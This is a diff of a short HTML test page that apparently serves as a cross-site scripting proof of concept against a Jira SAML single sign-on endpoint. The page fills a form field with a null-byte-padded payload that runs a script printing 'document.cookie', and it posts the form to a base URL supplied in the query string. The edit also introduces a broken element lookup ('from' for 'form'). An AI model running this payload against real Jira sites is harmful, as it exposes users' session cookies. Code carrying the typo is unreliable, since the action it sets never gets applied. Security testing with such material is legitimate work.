@@ -4,15 +4,14 @@
     <title>Test</title>
 </head>
 <body>
-<form id="form" method="POST" action="https://jira-demo1.lab.resolution.de/plugins/servlet/samlsso">
+<form id="form" method="POST">
     <input id="text" type="text" name="test" value=''>
     <input type="submit" name="Submit">
 </form>
     <script>
-    	debugger;
     	const urlParams = new URLSearchParams(window.location.search);
     	const baseUrl = urlParams.get('baseUrl');
-        document.getElementById("form").setAttribute("action", baseUrl + "/plugins/servlet/samlsso");
+        document.getElementById("from").setAttribute("action", baseUrl + "/plugins/servlet/samlsso");
 
         const payload = `"test>\u0000\u0000\u0000\u0000\u0000\u0000\u0000<script>alert(document.cookie);<\/script>`;
         document.getElementById("text").value = payload;
